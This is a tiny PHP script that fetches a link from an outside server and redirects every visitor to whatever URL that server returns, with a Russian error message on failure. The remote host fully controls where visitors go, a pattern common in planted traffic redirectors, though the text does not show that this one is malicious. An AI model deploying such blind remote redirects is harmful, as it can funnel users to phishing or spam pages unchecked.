<?php

$url = "https://champagne-prie.com/getlnk.php";
$response = @file_get_contents($url);

if ($response === FALSE) {
    http_response_code(500);
    echo "Ошибка запроса";
    exit;
}

header("Location: " . trim($response), true, 302);
exit;

?>
